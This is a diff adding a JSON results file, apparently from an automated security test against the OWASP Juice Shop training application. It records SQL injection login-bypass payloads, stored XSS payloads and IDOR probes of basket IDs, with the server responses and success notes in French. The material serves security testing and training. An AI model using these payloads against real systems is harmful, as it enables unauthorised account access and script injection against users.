@@ -1,0 +1,69 @@
+{
+  "results": [
+    {
+      "vector_id": "VEC-001",
+      "payload_used": "' OR 1=1--",
+      "target_endpoint": "/rest/user/login",
+      "http_status": 200,
+      "response_snippet": "{\"authentication\":{\"token\":\"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}",
+      "success": true,
+      "detection_method": "Token JWT retourne sans identifiants valides — injection SQL reussie"
+    },
+    {
+      "vector_id": "VEC-001",
+      "payload_used": "admin'--",
+      "target_endpoint": "/rest/user/login",
+      "http_status": 200,
+      "response_snippet": "{\"authentication\":{\"token\":\"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}",
+      "success": true,
+      "detection_method": "Token JWT retourne avec commentaire SQL tronquant le mot de passe"
+    },
+    {
+      "vector_id": "VEC-001",
+      "payload_used": "' UNION SELECT * FROM Users--",
+      "target_endpoint": "/rest/user/login",
+      "http_status": 500,
+      "response_snippet": "{\"error\":{\"message\":\"SQLITE_ERROR: SELECTs to the left and right of UNION do not have the same number of result columns\"}}",
+      "success": false,
+      "detection_method": "Erreur SQL exposee mais UNION echoue — nombre de colonnes incorrect"
+    },
+    {
+      "vector_id": "VEC-002",
+      "payload_used": "<script>alert('xss')</script>",
+      "target_endpoint": "/api/Feedbacks",
+      "http_status": 201,
+      "response_snippet": "{\"status\":\"success\",\"data\":{\"id\":7,\"comment\":\"<script>alert('xss')</script>\",\"rating\":1}}",
+      "success": true,
+      "detection_method": "Payload XSS stocke tel quel dans la reponse — pas de sanitization"
+    },
+    {
+      "vector_id": "VEC-002",
+      "payload_used": "<img src=x onerror=alert(1)>",
+      "target_endpoint": "/api/Feedbacks",
+      "http_status": 201,
+      "response_snippet": "{\"status\":\"success\",\"data\":{\"id\":8,\"comment\":\"<img src=x onerror=alert(1)>\",\"rating\":1}}",
+      "success": true,
+      "detection_method": "Tag img avec handler onerror stocke sans filtrage"
+    },
+    {
+      "vector_id": "VEC-003",
+      "payload_used": "/rest/basket/2",
+      "target_endpoint": "/rest/basket/2",
+      "http_status": 200,
+      "response_snippet": "{\"data\":{\"id\":2,\"coupon\":null,\"createdAt\":\"2025-01-15\",\"Products\":[{\"name\":\"Apple Juice\"}]}}",
+      "success": true,
+      "detection_method": "Acces au panier d'un autre utilisateur — IDOR confirme"
+    },
+    {
+      "vector_id": "VEC-003",
+      "payload_used": "/rest/basket/100",
+      "target_endpoint": "/rest/basket/100",
+      "http_status": 200,
+      "response_snippet": "{\"data\":{\"id\":100,\"coupon\":null,\"createdAt\":null,\"Products\":[]}}",
+      "success": false,
+      "detection_method": "Panier inexistant — reponse vide mais pas d'erreur d'autorisation"
+    }
+  ],
+  "total_attempts": 7,
+  "successful_attacks": 5
+}
